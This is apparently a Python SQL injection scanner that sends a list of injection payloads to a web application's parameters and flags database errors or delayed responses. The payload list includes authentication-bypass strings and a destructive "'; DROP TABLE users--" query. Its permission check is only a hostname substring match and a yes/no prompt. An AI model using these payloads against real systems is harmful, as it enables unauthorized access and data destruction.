#!/usr/bin/env python3
"""
SQL Injection Vulnerability Scanner
A tool to test web applications for SQL injection vulnerabilities.
ETHICAL USE ONLY - Only scan applications you own or have permission to test.
"""

import requests
import time
import argparse
import logging
import json
import re
from datetime import datetime
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('sqli_scan_results.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)


class SQLInjectionScanner:
    """SQL Injection vulnerability scanner with ethical safeguards"""
    
    # Common SQL injection payloads
    SQL_PAYLOADS = [
        # Basic SQL injection
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "admin'--",
        "admin\"--",
        
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        
        # Boolean-based
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        
        # Time-based
        "' OR SLEEP(5)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR pg_sleep(5)--",
        
        # Error-based
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        
        # Authentication bypass
        "admin' #",
        "admin'/*",
        "' or 1=1 limit 1--",
        "admin' or '1'='1'--",
        "' OR ''='",
        
        # Comment-based
        "-- ",
        "#",
        "/**/",
        
        # Stacked queries
        "'; DROP TABLE users--",
        "'; SELECT pg_sleep(5)--"
    ]
    
    # Error patterns that indicate SQL injection
    ERROR_PATTERNS = [
        # MySQL
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_.*",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL",
        
        # PostgreSQL
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        
        # MSSQL
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"(\W|\A)SQL Server.*Driver",
        r"Warning.*mssql_.*",
        r"Microsoft SQL Native Client error",
        r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver",
        
        # Oracle
        r"ORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_.*",
        r"Warning.*\Wora_.*",
        
        # Generic
        r"SQL command not properly ended",
        r"SQL syntax error",
        r"unexpected end of SQL command",
        r"unterminated quoted string",
        r"quoted string not properly terminated",
        r"You have an error in your SQL syntax",
        r"Unclosed quotation mark",
        r"Syntax error in query expression",
        r"SQLSTATE[^\s]+",
        r"sqlite3.OperationalError:",
        r"SQLite error",
    ]
    
    def __init__(self, target_url, max_workers=5, delay=1.0, timeout=10, cookies=None):
        """
        Initialize the SQL injection scanner
        
        Args:
            target_url (str): Target URL to scan
            max_workers (int): Maximum concurrent threads
            delay (float): Delay between requests (rate limiting)
            timeout (int): Request timeout in seconds
            cookies (dict): Authentication cookies
        """
        self.target_url = target_url
        self.max_workers = max_workers
        self.delay = delay
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SQLi-Scanner/1.0 (Ethical Security Testing)'
        })
        
        # Set cookies if provided
        if cookies:
            self.session.cookies.update(cookies)
            logger.info("Authentication cookies set")
        
        self.vulnerabilities = []
        self.lock = Lock()
        
        # Compile error patterns for faster matching
        self.compiled_patterns = [re.compile(pattern, re.IGNORECASE) 
                                 for pattern in self.ERROR_PATTERNS]
        
        logger.info(f"Scanner initialized for: {target_url}")
    
    def check_allowed_target(self):
        """
        Verify the target is allowed for testing
        Checks for common testing environments
        """
        allowed_indicators = [
            'localhost',
            '127.0.0.1',
            'dvwa',
            'testphp.vulnweb.com',
            'demo.testfire.net',
            'test',
            'staging',
            'dev'
        ]
        
        parsed = urlparse(self.target_url)
        hostname = parsed.netloc.lower()
        
        # Check if target is in allowed list
        is_allowed = any(indicator in hostname for indicator in allowed_indicators)
        
        if not is_allowed:
            print("\n" + "="*60)
            print("⚠️  WARNING: ETHICAL TESTING REQUIREMENT")
            print("="*60)
            print("This scanner should ONLY be used on:")
            print("  • Your own applications")
            print("  • Applications you have written permission to test")
            print("  • Authorized testing environments (DVWA, etc.)")
            print("\nUnauthorized scanning is ILLEGAL and UNETHICAL!")
            print("="*60)
            
            response = input("\nDo you have permission to scan this target? (yes/no): ")
            if response.lower() != 'yes':
                logger.warning("Scan cancelled - no permission confirmed")
                return False
        
        return True
    
    def detect_sqli_error(self, response_text):
        """
        Check response for SQL error patterns
        
        Args:
            response_text (str): HTTP response text
            
        Returns:
            tuple: (bool, str) - (is_vulnerable, error_type)
        """
        for pattern in self.compiled_patterns:
            match = pattern.search(response_text)
            if match:
                return True, match.group(0)
        return False, None
    
    def test_payload(self, param_name, payload, method='GET', data=None):
        """
        Test a single SQL injection payload
        
        Args:
            param_name (str): Parameter name to inject
            payload (str): SQL injection payload
            method (str): HTTP method (GET/POST)
            data (dict): POST data (if method is POST)
            
        Returns:
            dict: Vulnerability information if found
        """
        try:
            # Prepare the request
            if method.upper() == 'GET':
                # Inject in URL parameter
                test_url = f"{self.target_url}?{param_name}={payload}"
                response = self.session.get(test_url, timeout=self.timeout)
            else:
                # Inject in POST data
                test_data = data.copy() if data else {}
                test_data[param_name] = payload
                response = self.session.post(self.target_url, 
                                            data=test_data, 
                                            timeout=self.timeout)
            
            # Check for SQL errors in response
            is_vulnerable, error_msg = self.detect_sqli_error(response.text)
            
            if is_vulnerable:
                vuln_info = {
                    'url': self.target_url,
                    'parameter': param_name,
                    'payload': payload,
                    'method': method,
                    'error_message': error_msg,
                    'response_code': response.status_code,
                    'timestamp': datetime.now().isoformat()
                }
                
                with self.lock:
                    self.vulnerabilities.append(vuln_info)
                    logger.warning(f"VULNERABILITY FOUND: {param_name} with payload: {payload}")
                
                return vuln_info
            
            # Check for time-based injection (if payload contains sleep)
            if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                if response.elapsed.total_seconds() > 4:
                    vuln_info = {
                        'url': self.target_url,
                        'parameter': param_name,
                        'payload': payload,
                        'method': method,
                        'type': 'Time-based blind SQL injection',
                        'response_time': response.elapsed.total_seconds(),
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    with self.lock:
                        self.vulnerabilities.append(vuln_info)
                        logger.warning(f"TIME-BASED SQLI FOUND: {param_name}")
                    
                    return vuln_info
            
        except requests.exceptions.RequestException as e:
            logger.debug(f"Request error for payload '{payload}': {e}")
        except Exception as e:
            logger.error(f"Unexpected error testing payload: {e}")
        
        return None
    
    def scan_parameter(self, param_name, method='GET', data=None):
        """
        Scan a single parameter with all payloads
        
        Args:
            param_name (str): Parameter to test
            method (str): HTTP method
            data (dict): POST data
            
        Returns:
            list: List of vulnerabilities found
        """
        logger.info(f"Scanning parameter: {param_name} ({method})")
        
        found_vulns = []
        
        for payload in self.SQL_PAYLOADS:
            # Rate limiting
            time.sleep(self.delay)
            
            result = self.test_payload(param_name, payload, method, data)
            if result:
                found_vulns.append(result)
                # Stop after first vulnerability to avoid excessive requests
                logger.info(f"Stopping further tests on {param_name} - vulnerability confirmed")
                break
        
        return found_vulns
    
    def scan_get_parameters(self, parameters):
        """
        Scan GET parameters concurrently
        
        Args:
            parameters (list): List of parameter names
        """
        logger.info(f"Scanning {len(parameters)} GET parameters")
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {executor.submit(self.scan_parameter, param, 'GET'): param 
                      for param in parameters}
            
            for future in as_completed(futures):
                param = futures[future]
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Error scanning parameter {param}: {e}")
    
    def scan_post_parameters(self, parameters, base_data=None):
        """
        Scan POST parameters concurrently
        
        Args:
            parameters (list): List of parameter names
            base_data (dict): Base POST data
        """
        logger.info(f"Scanning {len(parameters)} POST parameters")
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {executor.submit(self.scan_parameter, param, 'POST', base_data): param 
                      for param in parameters}
            
            for future in as_completed(futures):
                param = futures[future]
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Error scanning parameter {param}: {e}")
    
    def generate_report(self, output_file='sqli_report.json'):
        """
        Generate vulnerability report
        
        Args:
            output_file (str): Output file path
        """
        report = {
            'scan_info': {
                'target': self.target_url,
                'timestamp': datetime.now().isoformat(),
                'total_vulnerabilities': len(self.vulnerabilities)
            },
            'vulnerabilities': self.vulnerabilities
        }
        
        # Save JSON report
        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"Report saved to: {output_file}")
        
        # Print summary
        self.print_summary()
    
    def print_summary(self):
        """Print scan summary to console"""
        print("\n" + "="*60)
        print("SQL INJECTION SCAN SUMMARY")
        print("="*60)
        print(f"Target URL: {self.target_url}")
        print(f"Scan completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Total vulnerabilities found: {len(self.vulnerabilities)}")
        print("="*60)
        
        if self.vulnerabilities:
            print("\n⚠️  VULNERABILITIES DETECTED:\n")
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{i}. Parameter: {vuln['parameter']}")
                print(f"   Method: {vuln['method']}")
                print(f"   Payload: {vuln['payload']}")
                if 'error_message' in vuln:
                    print(f"   Error: {vuln['error_message'][:100]}...")
                if 'type' in vuln:
                    print(f"   Type: {vuln['type']}")
                print()
        else:
            print("\n✅ No SQL injection vulnerabilities detected")
        
        print("="*60)
        print("⚠️  Remember: Only test applications you own or have")
        print("   explicit permission to test!")
        print("="*60 + "\n")


def print_banner():
    """Print tool banner"""
    banner = """
    ╔════════════════════════════════════════════════════╗
    ║       SQL Injection Vulnerability Scanner         ║
    ║              Ethical Testing Tool                  ║
    ╚════════════════════════════════════════════════════╝
    
    ⚠️  LEGAL NOTICE:
    This tool is for AUTHORIZED testing only.
    Unauthorized scanning is ILLEGAL.
    Only use on systems you own or have permission to test.
    """
    print(banner)


def main():
    """Main function"""
    print_banner()
    
    # Parse command-line arguments
    parser = argparse.ArgumentParser(
        description='SQL Injection Vulnerability Scanner (Ethical Use Only)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u http://localhost/dvwa/vulnerabilities/sqli/ -p id
  %(prog)s -u http://testphp.vulnweb.com/search.php -p searchFor
  %(prog)s -u http://localhost/login.php -m POST -p username,password
  %(prog)s -u http://localhost/test.php -p id --threads 10 --delay 0.5

Recommended Test Targets:
  • DVWA (Damn Vulnerable Web Application)
  • Local development applications
  • testphp.vulnweb.com (authorized testing site)
        """
    )
    
    parser.add_argument('-u', '--url', required=True,
                       help='Target URL to scan')
    parser.add_argument('-p', '--parameters', required=True,
                       help='Comma-separated list of parameters to test')
    parser.add_argument('-m', '--method', default='GET',
                       choices=['GET', 'POST'],
                       help='HTTP method (default: GET)')
    parser.add_argument('-d', '--data',
                       help='POST data in format: key1=value1&key2=value2')
    parser.add_argument('-t', '--threads', type=int, default=5,
                       help='Number of concurrent threads (default: 5)')
    parser.add_argument('--delay', type=float, default=1.0,
                       help='Delay between requests in seconds (default: 1.0)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('-o', '--output', default='sqli_report.json',
                       help='Output report file (default: sqli_report.json)')
    parser.add_argument('-c', '--cookies',
                       help='Cookies for authentication (format: name1=value1;name2=value2)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    
    args = parser.parse_args()
    
    # Set logging level
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Parse parameters
    parameters = [p.strip() for p in args.parameters.split(',')]
    
    # Parse POST data if provided
    post_data = None
    if args.data:
        post_data = {}
        for pair in args.data.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                post_data[key] = value
    
    # Parse cookies if provided
    cookies = None
    if args.cookies:
        cookies = {}
        for cookie in args.cookies.split(';'):
            cookie = cookie.strip()
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key] = value
    
    # Create scanner
    scanner = SQLInjectionScanner(
        target_url=args.url,
        max_workers=args.threads,
        delay=args.delay,
        timeout=args.timeout,
        cookies=cookies
    )
    
    # Check if target is allowed
    if not scanner.check_allowed_target():
        print("\n❌ Scan aborted - unauthorized target")
        return
    
    # Start scan
    print("\n" + "="*60)
    print("STARTING SCAN")
    print("="*60)
    print(f"Target: {args.url}")
    print(f"Method: {args.method}")
    print(f"Parameters: {', '.join(parameters)}")
    print(f"Threads: {args.threads}")
    print(f"Delay: {args.delay}s")
    print("="*60 + "\n")
    
    start_time = time.time()
    
    try:
        if args.method.upper() == 'GET':
            scanner.scan_get_parameters(parameters)
        else:
            scanner.scan_post_parameters(parameters, post_data)
        
        # Generate report
        scanner.generate_report(args.output)
        
    except KeyboardInterrupt:
        print("\n\n🛑 Scan interrupted by user")
        logger.warning("Scan interrupted")
        scanner.generate_report(args.output)
    except Exception as e:
        logger.error(f"Scan error: {e}")
    
    end_time = time.time()
    duration = end_time - start_time
    
    print(f"\nScan completed in {duration:.2f} seconds")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n👋 Goodbye!")
    except Exception as e:
        print(f"\n❌ Error: {e}")